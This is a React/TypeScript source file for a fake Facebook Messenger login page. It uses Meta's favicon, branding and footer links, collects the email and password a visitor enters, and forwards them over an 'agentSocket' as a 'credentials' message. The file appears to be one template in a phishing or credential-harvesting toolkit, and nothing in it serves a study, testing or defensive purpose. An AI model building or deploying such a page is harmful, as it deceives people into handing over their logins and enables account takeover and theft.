import {
  Button,
  Checkbox,
  createTheme,
  Grid,
  TextField,
  ThemeProvider,
  Typography,
} from "@mui/material";
import { FC, useEffect, useState } from "react";
import { useFavicon, useTitle } from "react-use";
import { MessengerIconSvg } from "../images";
import { AgentTemplateProps } from "../types";

export const MessengerTemplate: FC<AgentTemplateProps> = ({ title, agentSocket }) => {
  useTitle(title || document.title || "Messenger");
  useFavicon('https://static.xx.fbcdn.net/rsrc.php/ym/r/YQbyhl59TWY.ico');
  const theme = createTheme({
    palette: {
      primary: {
        main: "#0a7cff",
      }
    }
  });
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState(false);
  const handleSubmit = (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    if (!email || !password) {
      setError(true);
      return;
    }
    agentSocket.next({ type: 'credentials', payload: { type: 'messenger', email, password } });
  }
  useEffect(() => {
    setError(false);
  }, [email, password]);
  return <ThemeProvider theme={theme}>
    <Grid container spacing={2}>
      <Grid item xs={12}>
        <Grid container sx={{ height: '94.7vh' }} direction='column' justifyContent="center" alignItems='center' spacing={2}>
          <Grid item container justifyContent='center'>
            <form onSubmit={handleSubmit} autoComplete="off">
              <Grid item xs={12}>
                <img alt='logo' height={75} width={75} src={MessengerIconSvg} style={{ display: 'block', margin: `${theme.spacing(4)} auto` }} />
              </Grid>
              <Grid item xs={12} padding={1}>
                <Typography variant='h4' textAlign='center'>{error ? 'Messenger' : 'Connect with your favourite people'}</Typography>
              </Grid>
              {error && <Grid item xs={12} sx={{ textAlign: 'center' }}>
                <Typography color='error'>Wrong credentials</Typography>
                <Typography color='error'>Invalid username or password</Typography>
              </Grid>}
              <Grid item xs={12}>
                <TextField
                  size='small'
                  sx={{
                    width: 320,
                    '& input': {
                      width: 320
                    },
                    display: 'block',
                    margin: `auto`,
                    marginTop: theme.spacing(4)
                  }}
                  id='email'
                  name='email'
                  tabIndex={0}
                  variant='outlined'
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  placeholder='Email address or phone number' />
              </Grid>
              <Grid item xs={12}>
                <TextField
                  size='small'
                  sx={{
                    width: 320,
                    '& input': {
                      width: 320
                    },
                    display: 'block',
                    margin: `${theme.spacing(2)} auto`
                  }}
                  id='password'
                  name='password'
                  type='password'
                  tabIndex={1}
                  variant='outlined'
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  placeholder='Password' />
              </Grid>
              <Grid item xs={12}>
                <Button
                  type='submit'
                  variant='contained'
                  size='large'
                  sx={{
                    textTransform: 'none',
                    display: 'block',
                    margin: `${theme.spacing(3)} auto`,
                    borderRadius: 50,
                    boxShadow: 'none',
                    padding: '9.5px 20px',
                    fontSize: '15px',
                    '&:hover': {
                      backgroundColor: 'primary.main',
                      boxShadow: 'none'
                    }
                  }}>Continue</Button>
              </Grid>
              <Grid item xs={12} container justifyContent='center' sx={{ cursor: 'default' }}>
                <Checkbox
                  size='small'
                  disableRipple
                  sx={{
                    display: 'inline-block',
                    '& svg': {
                      fill: '#ccc',
                    },
                    '& input:checked + svg': {
                      fill: 'currentColor'
                    },
                    '&:hover': {
                      cursor: 'default'
                    }
                  }} />
                <Typography
                  sx={{
                    display: 'inline-block',
                    padding: '7.5px 0',
                  }}
                  variant='caption'
                  color='gray'
                  textAlign='center'>Keep me signed in</Typography>
              </Grid>
            </form>
          </Grid>
        </Grid>
      </Grid>
      <Grid item xs={12} container justifyContent='space-evenly' direction='column'>
        <Grid item xs={4} width='30%'></Grid>
        <Grid item xs={4} width='40%'>
          {['Not on Facebook?', 'Forgotten password', 'Data Policy', 'Terms', 'Cookies Policy', ' © Meta 2022'].map((text, index) => (
            <Typography
              key={index}
              variant='body2'
              color='gray'
              textAlign='center'
              sx={{
                fontStyle: 'bold',
                color: 'black',
                padding: `7.5px ${theme.spacing(2)}`,
                display: 'inline-block',
                margin: `${theme.spacing(2)} auto`
              }}>{text}</Typography>))}
        </Grid>
        <Grid item xs={4} width='30%'></Grid>
      </Grid>
    </Grid>
  </ThemeProvider>;
}
